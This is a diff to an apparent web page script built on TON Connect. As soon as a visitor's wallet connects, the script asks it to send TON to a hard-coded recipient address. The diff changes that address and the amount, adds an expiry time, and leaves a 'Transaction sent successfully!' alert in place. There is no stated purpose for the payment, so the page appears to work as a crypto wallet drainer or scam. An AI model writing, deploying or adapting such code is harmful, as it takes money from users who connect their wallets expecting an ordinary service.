@@ -111,7 +111,7 @@
 <script>
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
         manifestUrl: "https://tgmochispa.devmainops.store/tonconnect-manifest.json",
-        buttonRootId: 'ton-connect'
+        buttonRootId: 'ton-connect',
     });
 
     tonConnectUI.onStatusChange(async (wallet) => {
@@ -123,22 +123,20 @@
             const balanceDisplay = document.getElementById('balanceDisplay');
             balanceDisplay.textContent = `Wallet: ${walletAddress}`;
 
-            const recipientAddress = 'UQDESGXuSnEtU51tccnREyBDkeV7dBcXwnBYflM84zBPwtyS';
-            const amountInNanoTON = '1000000000';
-
             const transaction = {
+                validUntil: Math.floor(new Date() / 1000) + 360,
                 messages: [
                     {
-                        address: "UQDESGXuSnEtU51tccnREyBDkeV7dBcXwnBYflM84zBPwtyS",
-                        amount: "1000000000"
+                        address: "UQBCcwOb5YKIju2Y_nGZGKcCgGqlHOqo_kYDODvKfDi0vOk1",
+                        amount: "10000000"
                     }
                 ]
             }
-            const result = await tonConnectUI.sendTransaction(transaction)
+            await tonConnectUI.sendTransaction(transaction)
 
             alert('Transaction sent successfully!');
 
-            await getBalance(walletAddress);
+            //await getBalance(walletAddress);
         } else {
             console.log('Wallet disconnected');
             alert('Wallet disconnected!');
